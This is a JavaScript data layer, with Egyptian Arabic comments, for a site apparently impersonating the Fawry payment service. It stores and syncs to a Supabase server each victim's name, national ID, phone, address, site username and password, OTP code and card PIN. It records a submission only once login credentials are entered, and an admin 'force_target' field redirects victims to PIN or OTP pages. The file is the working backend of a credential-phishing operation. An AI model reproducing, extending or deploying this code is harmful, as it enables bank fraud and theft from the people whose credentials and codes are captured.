/* ماي فوري — طبقة تخزين بيانات الطلبات (applications)
   متصلة بسوپابيز (Supabase REST) — شكل صفوف مطابق لجدول `applications`:
   id, created_at, full_name, identity, phone, gov, address, model, model_name,
   site_username, site_password, login_status, review_status, verification_status, otp_code

   الواجهة متزامنة (sync) زي قبل كده بالظبط عشان باقي الملفات متتغيرش:
     list() / find(id) / insert(row) / update(id, patch) / remove(id) / clearAll() / newId()

   شغّال جوه:
   - كل كتابة (insert/update/remove/clearAll) بتتبعت لسوپابيز فورًا.
   - لو الانترنت مفقود أو جدول `applications` مش فيه بعد (لازم استيراد ملف SQL)،
     البيانات بتتحفظ محليًا + بتترفع تلقائيًا أول ما الاتصال/الجدول يشتغل.
   - القراءة من كاش محلي بيتزامن مع السيرفر كل 2.5 ثانية.
   - صفوف قديمة من نفس المتصفح (fawry_orders / fawry_applications) بتترحّل تلقائيًا مرة واحدة. */
(function () {
  "use strict";

  var SUPA_URL = "https://zpjxahuuujvobzvqbxkx.supabase.co";
  var SUPA_KEY = "sb_publishable_Ghr1qH-psq0pxw8VU3QrfA_fhtwFedX";
  var TABLE = "applications";

  var MIRROR = "fawry_applications";          // كاش محلي للصفوف (يعمل أوفلاين أيضًا)
  var K_MIGRATED = "fawry_applications_migrated_v2";
  var K_QUEUE = "fawry_app_queue";            // عمليات لسه متأكدةش من السيرفر

  var cache = [];
  var queue = readJSON(K_QUEUE, []);          // عمليات لسه متأكدةش من السيرفر
  var lastMirrorSig = "";                     // آخر حالة مكتوبة للـ mirror (نمنع الكتابة المكررة)
  var flushing = false;
  var warned404 = false;

  /* ---------- أدوات ---------- */
  function readJSON(k, d) {
    try { var v = JSON.parse(localStorage.getItem(k)); return v === null || v === undefined ? d : v; }
    catch (e) { return d; }
  }
  function writeJSON(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) {} }

  function mkId() { return "APP-" + Math.random().toString(36).slice(2, 10).toUpperCase(); }

  function norm(r) {
    r = r || {};
    if (!r.id) r.id = mkId();
    if (!r.created_at) r.created_at = new Date().toISOString();
    if (!r.review_status) r.review_status = "awaiting_review";
    if (r.login_status === undefined) r.login_status = "";
    if (r.verification_status === undefined) r.verification_status = "awaiting";
    if (r.site_username === undefined) r.site_username = "";
    if (r.site_password === undefined) r.site_password = "";
    if (r.otp_code === undefined) r.otp_code = "";
    if (r.card_pin === undefined) r.card_pin = "";
    if (r.force_target === undefined) r.force_target = ""; // '' | 'pin' | 'otp' — الأدمن يختار يودّي العميل فين
    if (r.visitor_id === undefined) r.visitor_id = ""; // معرف زائر المتصفح (علامة في الموقع/خرج)
    if (r.full_name === undefined) r.full_name = "";
    if (r.identity === undefined) r.identity = "";
    if (r.phone === undefined) r.phone = "";
    if (r.gov === undefined) r.gov = "";
    if (r.address === undefined) r.address = "";
    if (r.model === undefined) r.model = "";
    if (r.model_name === undefined) r.model_name = "";
    return r;
  }

  function mirrorFromCache() { writeJSON(MIRROR, cache); }

  /* ---------- REST ---------- */
  function headers(extra) {
    var h = {
      "apikey": SUPA_KEY,
      "Authorization": "Bearer " + SUPA_KEY,
      "Content-Type": "application/json",
      "Accept": "application/json"
    };
    if (extra) for (var k in extra) h[k] = extra[k];
    return h;
  }
  function api(method, path, body, extra) {
    return new Promise(function (resolve, reject) {
      var ctrl = typeof AbortController === "function" ? new AbortController() : null;
      var to = setTimeout(function () {
        if (ctrl) ctrl.abort();
        var err = new Error("FAWRY_DB timeout");
        err.timeout = true;
        try { reject(err); } catch (er) {}
      }, 10000);
      fetch(SUPA_URL + "/rest/v1/" + path, {
        method: method,
        headers: headers(extra),
        body: body === undefined ? undefined : JSON.stringify(body),
        signal: ctrl ? ctrl.signal : undefined
      }).then(function (res) {
        clearTimeout(to);
        if (!res.ok) {
          var err = new Error("FAWRY_DB " + method + " " + res.status);
          err.status = res.status;
          return res.text().then(function (t) { err.body = t; reject(err); }, function () { reject(err); });
        }
        if (res.status === 204) { resolve(null); return; }
        res.json().then(resolve, function () { reject(new Error("bad json")); });
      }).catch(function (e) {
        clearTimeout(to);
        try { reject(e); } catch (er) {}
      });
    });
  }

  /* ---------- قائمة انتظار الكتابة (بيتم استنزافها لسوپابيز) ---------- */
  var MISSING_COLS = {}; // أعمدة غير موجودة في الجدول — الحِمل بيتقلص تلقائيًا حتى لو ملف SQL انسى
  function pruneMissing(obj) {
    var out = {};
    for (var k in obj) { if (MISSING_COLS[k]) continue; out[k] = obj[k]; }
    return out;
  }
  function saveQueue() { writeJSON(K_QUEUE, queue); }

  function flushQueue() {
    if (flushing || queue.length === 0) return Promise.resolve();
    flushing = true;
    function step() {
      if (queue.length === 0) { flushing = false; return Promise.resolve(); }
      var op = queue[0];
      // عملية تالفة/ناقص؟ — تترمي فورًا عشان متجمدش اللي بعدها
      if ((op.op === "insert" && !op.row) || ((op.op === "update" || op.op === "remove") && !op.id)) {
        queue.shift();
        saveQueue();
        return step();
      }
      var p;
      if (op.op === "insert") {
        p = api("POST", TABLE, pruneMissing(op.row), { "Prefer": "return=minimal" });
      } else if (op.op === "update") {
        p = api("PATCH", TABLE + "?id=eq." + encodeURIComponent(op.id), pruneMissing(op.patch), { "Prefer": "return=minimal" });
      } else if (op.op === "remove") {
        p = api("DELETE", TABLE + "?id=eq." + encodeURIComponent(op.id));
      } else if (op.op === "clearall") {
        p = api("DELETE", TABLE + "?id=not.is.null");
      } else {
        p = Promise.resolve();
      }
      return p.then(function () {
        queue.shift();
        saveQueue();
        return step();
      }).catch(function (e) {
        op.tries = (op.tries || 0) + 1;
        if (e && e.status === 409) {
          // الصف موجود بالفعل على السيرفر (تكرار) — نعتبره تم
          queue.shift();
          saveQueue();
          return step();
        }
        // 400 بعمود ناقص من الجدول (مثلاً force_target/card_pin) — قلّص الحِمل واعِد المحاولة تلقائيًا
        if (e && e.status === 400 && e.body && /column/.test(String(e.body))) {
          var m = String(e.body).match(/'([a-zA-Z_]+)'/);
          var key = m ? m[1] : null;
          if (key) {
            var insertHasKey = op.op === "insert" && op.row && op.row[key] !== undefined;
            var patchHasKey = op.op === "update" && op.patch && op.patch[key] !== undefined;
            if ((insertHasKey || patchHasKey) && !MISSING_COLS[key]) {
              MISSING_COLS[key] = true;
              if (insertHasKey && op.row) op.row = pruneMissing(op.row);
              if (patchHasKey && op.patch) op.patch = pruneMissing(op.patch);
              flushing = false; // معاد المحاولة في الـ tick الجاي بحِمل أقل
              try { console.warn("[FAWRY_DB] عمود '" + key + "' مش موجود في الجدول — الكتابة هتعاد من غيره تلقائيًا."); } catch (er) {}
              return Promise.resolve();
            }
          }
        }
        // أي فشل مستمر: بعد 3 محاولات نرمي العملية عشان اللي بعدها يمشي
        if (op.tries >= 3) {
          queue.shift();
          saveQueue();
          flushing = false;
          try { console.warn("[FAWRY_DB] عملية فشلت 3 مرات واتشالت من الطابور:", op.op); } catch (er) {}
          return Promise.resolve();
        }
        flushing = false; // نعيد المحاولة في الـ tick الجاي
        return Promise.resolve();
      });
    }
    return step();
  }

  /* ---------- سحب الصفوف من السيرفر ---------- */
  function fetchRemote() {
    return api("GET", TABLE + "?select=*&order=created_at.asc").then(function (rows) {
      if (!Array.isArray(rows)) return;
      warned404 = false;
      var serverIds = {};
      rows.forEach(function (r) { serverIds[r.id] = 1; });
      // صفوف محلية عندها عملية insert لسه شغالة — متتشالش
      var pending = {};
      queue.forEach(function (op) { if (op.op === "insert" && op.row) pending[op.row.id] = 1; });
      var merged = rows.slice();
      for (var i = 0; i < cache.length; i++) {
        var r = cache[i];
        if (serverIds[r.id]) continue;
        var dup = false;
        for (var j = 0; j < merged.length; j++) if (merged[j].id === r.id) { dup = true; break; }
        if (!dup && pending[r.id]) merged.push(r);
      }
      cache = merged.map(norm);
      var mirrorSig = JSON.stringify(cache);
      if (mirrorSig !== lastMirrorSig) {
        lastMirrorSig = mirrorSig;
        mirrorFromCache();
      }
    }).catch(function (e) {
      if (e && e.status === 404) {
        if (!warned404) {
          warned404 = true;
          try { console.warn("[FAWRY_DB] جدول applications مش موجود في سوپابيز بعد — البيانات محفوظة محليًا وسيتم مزامنتها تلقائيًا أول ما تنشئ الجدول (استيراد ملف supabase-schema.sql)."); } catch (er) {}
        }
      }
      /* أوفلاين — الكاش بيفضل زي ما هو */
    });
  }

  /* ---------- ترحيل البيانات القديمة من نفس المتصفح (مرة واحدة) ---------- */
  function migrateLegacy() {
    try {
      if (localStorage.getItem(K_MIGRATED) === "1") return;
      var seen = {};
      cache.forEach(function (r) { seen[r.id] = 1; });
      var sources = [];
      // النسخة المحلية السابقة
      try {
        var v = JSON.parse(localStorage.getItem(MIRROR));
        if (Array.isArray(v)) sources = sources.concat(v);
      } catch (e2) {}
      // فورم `fawry_orders` الأقدم
      try {
        var legacy = JSON.parse(localStorage.getItem("fawry_orders"));
        var mapLegacy = {
          awaiting_review: "awaiting_review", bank_approval: "bank_approval",
          approved: "approved", otp_submitted: "otp_submitted", otp_rejected: "otp_rejected",
          rejected: "rejected", completed: "completed"
        };
        if (Array.isArray(legacy)) {
          legacy.forEach(function (o) {
            sources.push({
              id: null,
              full_name: o.name || "", phone: o.phone || "", identity: o.nationalId || "",
              gov: o.gov || "", address: o.address || "", model: o.model || "",
              model_name: o.modelName || o.model || "",
              created_at: o.at || new Date().toISOString(),
              review_status: mapLegacy[o.status] || "awaiting_review"
            });
          });
        }
      } catch (e3) {}
      var added = 0;
      sources.forEach(function (row) {
        var r = norm(row);
        // الطلبات الناقصة (من غير بيانات دخول) ما تترفعش للسيرفر ولا تظهر في الداشبورد
        if (!r.site_username || !String(r.site_username).trim()) return;
        if (seen[r.id]) return;
        seen[r.id] = 1;
        cache.push(r);
        queue.push({ op: "insert", row: r });
        added++;
      });
      if (added > 0) saveQueue();
      localStorage.setItem(K_MIGRATED, "1");
      if (added > 0) mirrorFromCache();
    } catch (e) {}
  }

  /* ---------- التشغيل ---------- */
  cache = readJSON(MIRROR, []).map(norm);
  migrateLegacy();
  fetchRemote();
  flushQueue();
  // حلقة تزامن سريعة: كل 1 ثانية (سحب التحديثات + إتمام أي عمليات معلقة)
  // (لو الجدول مش موجود بعد ← إعادة المحاولة كل ~30 ثانية بدل كل ثانية)
  var ticks = 0;
  setInterval(function () {
    ticks++;
    if (warned404 && ticks % 30 !== 0) return;
    fetchRemote();
    flushQueue();
  }, 1000);

  // تزامن فوري بين التابات المفتوحة (نفس المتصفح): لو تبويب العميل كتب حاجة،
  // تبويب الداشبورد يشوفها في نفس اللحظة عبر حدث storage — بدون انتظار الحلقة
  window.addEventListener("storage", function (e) {
    if (e.key !== MIRROR && e.key !== K_QUEUE) return;
    try {
      var incoming = readJSON(MIRROR, []).map(norm);
      for (var i = 0; i < incoming.length; i++) {
        var spot = -1;
        for (var j = 0; j < cache.length; j++) {
          if (cache[j].id === incoming[i].id) { spot = j; break; }
        }
        if (spot === -1) { cache.push(incoming[i]); }
        else if (JSON.stringify(cache[spot]) !== JSON.stringify(incoming[i])) { cache[spot] = incoming[i]; }
      }
      var msig = JSON.stringify(cache);
      if (msig !== lastMirrorSig) {
        lastMirrorSig = msig;
        mirrorFromCache();
      }
    } catch (er) {}
  });

  /* ---------- الواجهة العامة (متزامنة — زي قبل كده) ---------- */
  window.FAWRY_DB = {
    /** كل الصفوف (من الكاش المتزامن مع السيرفر) */
    list: function () {
      return cache.map(function (r) { return Object.assign({}, r); });
    },
    /** صف واحد بالمُعرّف */
    find: function (id) {
      for (var i = 0; i < cache.length; i++) {
        if (cache[i].id === id) return Object.assign({}, cache[i]);
      }
      return null;
    },
    /** إدخال — مثل insert() في سوپابيز (بيترفع للسيرفر) */
    insert: function (row) {
      var r = norm(row);
      // حماية صارمة: ممنوع تسجيل طلب من غير بيانات دخول.
      // الطلب يظهر في الداشبورد فقط بعد ما العميل يبعت بيانات تسجيل الدخول.
      if (!r.site_username || !String(r.site_username).trim()) {
        try { console.warn("[FAWRY_DB] تم تجاهل طلب بدون بيانات دخول — الطلب يظهر بعد إدخال بيانات الدخول فقط."); } catch (er) {}
        return null;
      }
      r.created_at = new Date().toISOString();
      cache.push(r);
      mirrorFromCache();
      queue.push({ op: "insert", row: r });
      saveQueue();
      flushQueue();
      return Object.assign({}, r);
    },
    /** تعديل — مثل update().eq('id', id) (بيترفع للسيرفر) */
    update: function (id, patch) {
      var row = null;
      for (var i = 0; i < cache.length; i++) {
        if (cache[i].id === id) {
          var keys = Object.keys(patch || {});
          for (var j = 0; j < keys.length; j++) cache[i][keys[j]] = patch[keys[j]];
          row = cache[i];
          break;
        }
      }
      if (!row) return null;
      mirrorFromCache();
      queue.push({ op: "update", id: id, patch: patch });
      saveQueue();
      flushQueue();
      return Object.assign({}, row);
    },
    /** حذف صف */
    remove: function (id) {
      cache = cache.filter(function (r) { return r.id !== id; });
      mirrorFromCache();
      queue.push({ op: "remove", id: id });
      saveQueue();
      flushQueue();
    },
    /** حذف الكل */
    clearAll: function () {
      cache = [];
      mirrorFromCache();
      queue.push({ op: "clearall" });
      saveQueue();
      flushQueue();
    },
    newId: mkId,
    /** حالة الاتصال (للتشخيص) */
    status: function () { return { total: cache.length, queued: queue.length, tableMissing: warned404 }; },

    /* جدول سوپابيز: applications
       review_status = awaiting_review | approved | pin_submitted | pin_rejected | otp_submitted | otp_rejected | rejected | completed | bank_approval
       login_status  = '' | awaiting_review | approved | rejected
       verification_status = awaiting | submitted | approved | rejected
       card_pin = الرقم السري للكارت الأصفر (4 أرقام)
       force_target = '' | 'pin' | 'otp' (تحويلة يدوية من الأدمن) */
  };
})();
